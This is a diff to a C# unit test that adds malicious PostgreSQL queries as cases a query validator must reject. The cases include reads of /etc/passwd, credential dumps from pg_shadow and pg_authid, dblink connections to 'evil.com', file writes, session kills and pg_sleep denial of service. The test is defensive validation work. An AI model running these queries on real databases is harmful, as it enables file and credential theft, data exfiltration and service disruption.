@@ -117,6 +117,29 @@ public class DatabaseQueryCommandTests
     [InlineData("SELECT * FROM users /* block comment */")] // block comment
     [InlineData("SELECT * FROM users; SELECT * FROM other;")] // stacked
     [InlineData("UPDATE accounts SET balance=0;")]
+    [InlineData("SELECT pg_read_file('/etc/passwd')")] // file read
+    [InlineData("SELECT pg_read_binary_file('/etc/hostname')")] // binary file read
+    [InlineData("SELECT pg_ls_dir('/etc')")] // directory listing
+    [InlineData("SELECT pg_ls_logdir()")] // log directory listing
+    [InlineData("SELECT pg_ls_waldir()")] // WAL directory listing
+    [InlineData("SELECT pg_ls_tmpdir()")] // tmp directory listing
+    [InlineData("SELECT usename, passwd FROM pg_shadow")] // credential access
+    [InlineData("SELECT rolname, rolsuper FROM pg_authid")] // auth access
+    [InlineData("SELECT lo_import('/etc/passwd')")] // large object import
+    [InlineData("SELECT lo_get(12345)")] // large object read
+    [InlineData("SELECT dblink('host=evil.com')")] // external connection
+    [InlineData("SELECT dblink_connect('host=evil.com')")] // external connection
+    [InlineData("SELECT pg_file_write('/tmp/evil', 'data', false)")] // file write
+    [InlineData("SELECT encode(pg_read_binary_file('/etc/hostname'), 'hex')")] // encoded file read
+    [InlineData("SELECT pg_stat_file('/etc/passwd')")] // file metadata
+    [InlineData("SELECT pg_terminate_backend(1234)")] // session kill DoS
+    [InlineData("SELECT pg_cancel_backend(1234)")] // session cancel DoS
+    [InlineData("SELECT pg_reload_conf()")] // config reload
+    [InlineData("SELECT set_config('log_statement', 'all', false)")] // runtime setting change
+    [InlineData("SELECT current_setting('config_file')")] // setting leak
+    [InlineData("SELECT pg_sleep(3600)")] // denial-of-service
+    [InlineData("SELECT * FROM pg_stat_activity")] // cross-session info leak
+    [InlineData("SELECT * FROM pg_user_mappings")] // FDW credential exposure
     public async Task ExecuteAsync_InvalidQuery_ValidationError(string badQuery)
     {
         var command = new DatabaseQueryCommand(_logger);
